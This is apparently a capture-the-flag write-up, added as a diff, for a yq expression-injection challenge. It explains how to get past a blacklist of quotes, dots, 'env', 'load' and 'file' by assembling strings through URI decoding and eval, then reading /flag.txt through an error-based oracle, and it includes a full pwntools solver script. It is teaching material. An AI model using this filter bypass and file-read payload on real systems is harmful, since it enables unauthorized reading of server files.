@@ -1,0 +1,62 @@
+---
+title: "Yet Another Injection Challenge"
+categories: ["misc"]
+solves: 27
+---
+# Challenge
+The string you input is passed directly to `yq -n <expr>`, and `ok` is returned on success or `error` on failure. Additionally, inputs containing `"` / `.` / `env` / `load` / `file` are rejected.
+
+# Solution
+`yq` is a command for handling YAML/JSON. Since `-n` is specified, there is no input from a file; the expression `<expr>` is evaluated and its result is output. If evaluation fails, `error` is output.
+
+Without the filters, you could read the flag with something like `load_str("/flag.txt")` and recover the content using an error-based oracle. However, since `"` and `load` are banned, direct approaches are not possible.
+Fortunately, `yq` has an `eval` function that allows executing an arbitrary expression built as a string. To use this, we need to construct the string `load_str("/flag.txt")`.
+
+If we can construct any single character as a string, we can concatenate them to build any string.
+Reading the [yq documentation](https://mikefarah.gitbook.io/yq), we find that `@urid` and `@uri` can be used to URI-encode/decode strings. Using this, if we can construct the 17 characters `%`, `1`-`9`, `a`-`f`, we can concatenate them in the form `%XX` and apply `@urid` to produce any character.
+
+`%` can be constructed with `1|tag|@uri|split(2)|first(0)` (since `1|tag|@uri` yields `"%21%21int"`, splitting by `"2"` gives `["%", "1%", "1int"]`, and taking the first element gives `"%"`).
+
+`1`-`9` can easily be constructed as `1|to_string`, etc. `a`-`f` can be constructed using `%` and `1`-`6` as `"%61"|@urid`, etc.
+
+Now we can construct any string. Next, execute `load_str("/flag.txt")` inside `eval` and identify the flag one character at a time.
+To identify characters, we can use an expression like `load_str("/flag.txt")/""|.[i]<"c" or error(0)`. `a/""|.[i]` gets the i-th character of `a`, and due to short-circuit evaluation, `error(0)` is called only when `<"c"` evaluates to `false`.
+
+The solver is as follows. It first constructs each character, then references them later using the `as` syntax.
+
+<details>
+<summary>Solver (click to expand)</summary>
+```python
+from pwn import *
+
+chars = [
+    "1|tag|@uri|split(2)|first(0) as $p",
+    *[f"{i}|to_string as ${i}" for i in range(10)],
+    *[f"$p+{c:02x}|to_string|@urid as ${chr(c)}" for c in b"abcdef"],
+]
+
+sc = remote("localhost", 9999)
+
+def oracle(payload):
+    payload = "+".join(f"$p+${c//16:x}+${c%16:x}" for c in payload.encode())
+    payload = f"{"|".join(chars)}|eval({payload}|@urid)".encode()
+    sc.sendlineafter(b": ", payload)
+    return "ok" in sc.recvuntil(b"expr").decode()
+
+flag = ""
+for i in range(100):
+    if not oracle(f"""load_str("/flag.txt")|length>{i} or error(0)"""):
+        break
+    l = 0x20
+    r = 0x80
+    while r - l > 1:
+        m = (l + r) // 2
+        res = oracle(f"""load_str("/flag.txt")/""|.[{i}]<"{chr(m)}" or error(0)""")
+        if res:
+            r = m
+        else:
+            l = m
+    flag += chr(l)
+print(flag)
+```
+</details>
